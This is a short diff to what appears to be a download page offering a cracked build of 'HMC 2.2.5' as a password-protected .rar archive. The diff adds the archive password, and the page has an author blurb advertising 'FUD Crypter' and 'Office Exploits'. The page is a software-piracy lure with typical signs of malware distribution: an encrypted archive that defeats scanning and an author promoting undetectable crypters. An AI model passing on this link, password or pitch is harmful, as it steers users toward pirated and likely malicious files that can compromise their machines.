@@ -8,6 +8,8 @@ Here, I'm sharing with you the lastest version of HMC (2.2.5). This is not the o
 
 **[DOWNLOAD HERE](https://luxuryshield.org/HMCCrackedbyUniversal2.2.5.rar)**
 
+PASSWORD: CrackedBy@Universdevz
+
 **Who am I ?**
 
 I'm young dev working on cybersecurity (FUD Crypter, Office Exploits,...)
